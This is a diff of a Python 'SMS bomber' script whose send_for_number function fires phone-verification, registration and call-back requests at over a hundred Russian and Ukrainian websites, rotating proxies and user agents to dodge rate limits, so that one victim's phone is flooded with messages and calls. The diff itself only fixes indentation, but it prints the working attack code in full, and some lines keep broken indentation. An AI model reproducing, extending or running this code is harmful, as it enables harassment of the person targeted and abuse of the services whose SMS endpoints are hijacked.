@@ -364,42 +364,42 @@ def send_for_number(phone):
 		requests.post('https://cash-u.com/main/rest/firstrequest/phone/confirmation/send', data = {phone_format(phone, 'X (XXX) XXX-XX-XX'): ''},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post('https://www.tanuki.ru/sendCode/', json = {"phone":phone_format(phone, "(+X)XXXXXXXXXX"),"smsType":2,"headers":{"version":"2.0","userId":"666ebf12-9cd5-ed2f-a7c9-67f3a8d99ab1","debugMode":True,"agent":{"device":"mobile","version":"undefined undefined"},"dbgValue":"","langId":"1","cityId":"1"}},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post('https://goldapple.ru/rest/V1/customer/registration/start', json = {"country_code":"RU","phone":phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.get('https://app.taxsee.com/send-link/?intl=ru-RU&phone=%2B' + phone_format(phone, 'XXX(XX)XXX-XX-XX'),headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post('https://app.burgerking.ru/bridge/auth/index', json = {'phone': "+" + phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://www.gloria-jeans.ru/phone-verification/send-code/registration", json={"phoneNumber": "+" + phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://kinoteatr.ru/cgi-bin/api.pl",json={"method": "SendSMSToConfirmPhone","params": {"Phone": phone[1:]}},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
-	    print('+')
+		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post('https://prosto.tv/wp-admin/admin-ajax.php', data={'action': 'check-phone', 'phone': '+'+phone, "username": random.choice(_nameR), '_nonce': '1a79e1841d'}, headers = {'user-agent': ua.random},proxies={'http': random.choice(proxy_for_spam)})
 	  print('+')
@@ -587,7 +587,7 @@ def send_for_number(phone):
 		)
   		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://www.moyo.ua/identity/registration",
@@ -597,7 +597,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 
 	try:
 		requests.post(
@@ -608,7 +608,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		frisor = {
 			"Content-type": "application/json",
@@ -627,14 +627,14 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://kasta.ua/api/v2/login/", data={"phone": phone}, timeout=2
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://izi.ua/api/auth/register",
@@ -648,7 +648,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://junker.kiev.ua/postmaster.php",
@@ -657,7 +657,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA",
@@ -673,7 +673,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://stores-api.zakaz.ua/user/signup/",
@@ -690,7 +690,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://youla.ru/web-api/auth/request_code",
@@ -700,7 +700,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://cloud.mail.ru/api/v2/notify/applink",
@@ -715,7 +715,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
@@ -730,7 +730,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
@@ -740,7 +740,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://crm.getmancar.com.ua/api/veryfyaccount",
@@ -755,7 +755,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://www.icq.com/smsreg/requestPhoneValidation.php",
@@ -772,7 +772,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://api.pozichka.ua/v1/registration/send",
@@ -782,7 +782,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			f"https://secure.online.ua/ajax/check_phone/?reg_phone={phone}",
@@ -791,7 +791,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+{}".format(
@@ -802,7 +802,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",
@@ -812,7 +812,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://city24.ua/personalaccount/account/registration",
@@ -822,7 +822,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://helsi.me/api/healthy/accounts/login",
@@ -832,7 +832,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://cloud.mail.ru/api/v2/notify/applink",
@@ -842,7 +842,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://auth.multiplex.ua/login",
@@ -852,7 +852,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://account.my.games/signup_send_sms/",
@@ -862,7 +862,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.get(
 			"https://cabinet.planetakino.ua/service/sms",
@@ -872,7 +872,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
@@ -882,7 +882,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://youla.ru/web-api/auth/request_code",
@@ -892,7 +892,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://rutube.ru/api/accounts/sendpass/phone",
@@ -902,7 +902,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
@@ -913,7 +913,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
@@ -923,7 +923,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://passport.twitch.tv/register?trusted_request=true",
@@ -940,7 +940,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://lk.belkacar.ru/register",
@@ -950,7 +950,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://api.ivi.ru/mobileapi/user/register/phone/v6",
@@ -960,7 +960,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://www.sportmaster.ua/",
@@ -976,7 +976,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://secure.online.ua/ajax/check_phone/",
@@ -986,7 +986,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://www.nl.ua",
@@ -1002,7 +1002,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://mobileplanet.ua/register",
@@ -1016,7 +1016,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://api.delitime.ru/api/v2/signup",
@@ -1026,7 +1026,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://apteka366.ru/login/register/sms/send",
@@ -1036,7 +1036,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://belkacar.ru/get-confirmation-code",
@@ -1046,7 +1046,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://drugvokrug.ru/siteActions/processSms.html",
@@ -1056,7 +1056,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://api.ennergiia.com/auth/api/development/lor",
@@ -1066,7 +1066,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.get(
 			"https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber={}".format(
@@ -1077,7 +1077,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://gorzdrav.org/login/register/sms/send",
@@ -1087,7 +1087,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
@@ -1097,7 +1097,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://api-production.viasat.ru/api/v1/auth_codes",
@@ -1107,7 +1107,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://eda.yandex/api/v1/user/request_authentication_code",
@@ -1117,7 +1117,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			f"https://www.citilink.ru/registration/confirm/phone/+{phone}/",
@@ -1126,7 +1126,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://eda.yandex/api/v1/user/request_authentication_code",
@@ -1136,7 +1136,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://my.dianet.com.ua/send_sms/",
@@ -1146,7 +1146,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.get(
 			"https://api.eldorado.ua/v1/sign/",
@@ -1162,7 +1162,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post(
 			"https://shafa.ua/api/v3/graphiql",
@@ -1176,7 +1176,7 @@ def send_for_number(phone):
 		)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	def mask(str, maska):
 				if len(str) == maska.count('#'):
 					str_list = list(str)
@@ -1188,60 +1188,60 @@ def send_for_number(phone):
 		requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonee,"email":"","city":""}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		phonee = mask(str=phone[1:], maska="8(###)###-##-##")
 		requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		phonee = mask(str=phone, maska="+# (###) ###-##-##")
 		requests.post("https://yaponchik.net/login/login.php",data={"login": "Y","countdown": "0","step": "phone","redirect": "/profile/","phone": phonee, "code":""}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName":"иванов","firstName":"иван","middleName":"иванович","mobilePhone":phone,"email":email,"smsCode":""}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://b.utair.ru/api/v1/profile/", json={"phone":phone,"confirmationGDPRDate": int(str(datetime.datetime.now().timestamp()).split('.')[0]) }, proxies=proxies, timeout=10)
 		requests.post("https://b.utair.ru/api/v1/login/", json={"login":phone,"confirmation_type":"call_code"}, proxies=proxies, timeout=10) 
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		# под сомнением 
 		phonee = mask(str=phone, maska="#(###)###-##-##")
@@ -1251,359 +1251,359 @@ def send_for_number(phone):
 		requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"phone":"+7(915)350-99-08","action":"sendSmsAgain"}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",json={"doc": {"auth": {"mphone": "+" + phone,"bdate": "11.11.1999","deviceid": "00100","version": "1.0","source": "site","signature": "undefined",}}},headers={"Accept": "application/json"}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		phonee = mask(str=phone, maska="+# (###) ###-##-##")
 		requests.post("https://www.top-shop.ru/login/loginByPhone/",data={"phone": phonee}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		phonee = mask(str=phone, maska="8(###)###-##-##")
 		requests.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://thehive.pro/auth/signup", json={"phone": "+"+phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://msk.tele2.ru/api/validation/number/"+phone, json={"sender": "Tele2"}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		phonee = mask(phone, maska="+# (###) ### - ## - ##")
 		requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php",data={"RECALL": "Y", "BACK_CALL_PHONE": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php",data={"action": "callback_phonenumber", "phone": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		phonee = mask(str=phone, maska="(+#)##########")
 		requests.post("https://www.tanuki.ru/api/",json={"header": {"version": "2.0","userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}","agent": {"device": "desktop", "version": "undefined undefined"},"langId": "1","cityId": "9",},"method": {"name": "sendSmsCode"},"data": {"phone": phonee, "type": 1}}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://tabasko.su/",data={"IS_AJAX": "Y","COMPONENT_NAME": "AUTH","ACTION": "GET_CODE","LOGIN": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://www.sushi-profi.ru/api/order/order-call/",json={"phone": phone9, "name": name}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://client-api.sushi-master.ru/api/v1/auth/init",json={"phone": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		phonee = mask(str=phone9, maska="8(###)###-##-##")
 		requests.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		phonee = mask(str=phone9, maska="8 (###) ###-##-##")
 		requests.post("http://sushigourmet.ru/auth",data={"phone": phonee, "stage": 1}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://sushifuji.ru/sms_send_ajax.php",data={"name": "false", "phone": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.get("https://auth.pizza33.ua/ua/join/check/",params={"callback": "angular.callbacks._1","email": email,"password": password,"phone": phone9,"utm_current_visit_started": 0,"utm_first_visit": 0,"utm_previous_visit": 0,"utm_times_visited": 0}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.get("https://suandshi.ru/mobile_api/register_mobile_user",params={"phone": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		phonee = mask(str=phone9, maska="8-###-###-##-##")
 		requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "registration","tpl": "restore_password","phone": phonee}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		phonee = mask(str=phone, maska="+# (###) ###-##-##")
 		requests.get("https://www.sportmaster.ru/user/session/sendSmsCode.do", params={"phone": phonee}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",data={"demo_number": "+" + phone, "ajax_demo_send": "1"}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+"+phone, "action": "confirm_mobile"}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+"+phone, "resend": 0}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+"+phone},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n	isSuccess\n	userToken\n	errors {\n	  field\n	  messages {\n		message\n		code\n		__typename\n	  }\n	  __typename\n	}\n	__typename\n  }\n}\n"}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "sendResetPasswordSms","variables": {"phoneNumber": "+"+phone},"query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n	isSuccess\n	userToken\n	errors {\n	  ...errorsData\n	  __typename\n	}\n	__typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n	code\n	message\n	__typename\n  }\n  __typename\n}\n"}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://sayoris.ru/?route=parse/whats", data={"phone": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login",data={"data": {"login":phone9,"check":True,"crypto":{"captcha":"739699"}}}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": "+"+phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://rieltor.ua/api/users/register-sms/",json={"phone": phone, "retry": 0}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php",data={"phone": "+"+phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		phonee = mask(str=phone, maska="+#(###)###-##-##")
 		requests.post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",data={"phone": phonee, "alien": "0"}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",params={"number": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.get("https://sso.cloud.qlean.ru/http/users/requestotp",headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},params={"phone": phone,"clientId": "undefined","sessionId": str(randint(5000, 9999))}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://www.prosushi.ru/php/profile.php",data={"phone": "+"+phone, "mode": "sms"}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		phonee = mask(str=phone, maska="+#-###-###-##-##")
 		requests.post("https://api.pozichka.ua/v1/registration/send",json={"RegisterSendForm": {"phone": phonee}}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		phonee = mask(str=phone, maska="+# (###) ###-##-##")
 		requests.post("https://butovo.pizzapomodoro.ru/ajax/user/auth.php",data={"AUTH_ACTION": "SEND_USER_CODE","phone": phonee}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		phonee = mask(str=phone, maska="+# (###) ###-##-##")
 		requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",data={"phone": phonee}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		phonee = mask(str=phone9, maska="8-###-###-##-##")
 		requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "call_me","task": "request_call","name": name,"phone": phonee}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://pizzasinizza.ru/api/phoneCode.php", json={"phone": phone9}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://pizzakazan.com/auth/ajax.php",data={"phone": "+"+phone, "method": "sendCode"}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		phonee = mask(str=phone, maska="+# (###) ###-####")
 		requests.post("https://pizza46.ru/ajaxGet.php",data={"phone": phonee}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+"+phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		phonee = mask(str=phone, maska="+#-###-###-##-##")
 		requests.post("https://paylate.ru/registry",data={"mobile": phonee,"first_name": name,"last_name": name,"nick_name": name,"gender-client": 1,"email": email,"action": "registry"}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",data={"telephone": "8"+phone9}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": phone, "otpId": 0}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		phonee = mask(str=phone, maska="+# (###) ###-####")
 		requests.post("https://www.osaka161.ru/local/tools/webstroy.webservice.php",data={"name": "Auth.SendPassword","params[0]": phonee}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://ontaxi.com.ua/api/v2/web/client",json={"country": "UA","phone": phone[3:]}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://www.ollis.ru/gql",json={"query":"mutation { phone(number:\""+phone+"\", locale:ru) { token error { code message } } }"}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		phonee = mask(str=phone9, maska="8 (###) ###-##-##")
 		requests.get("https://okeansushi.ru/includes/contact.php",params={"call_mail": "1","ajax": "1","name": name,"phone": phonee,"call_time": "1","pravila2": "on"}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+"+phone}, proxies=proxies, timeout=10)
 		print('+')
 	except:
-	    print('-')
+		print('-')
 	try:
 		requests.post("https://nn-card.ru/api/1.0/covid/login", json={"phone": phone}, proxies=proxies, timeout=10)
 		print('+')
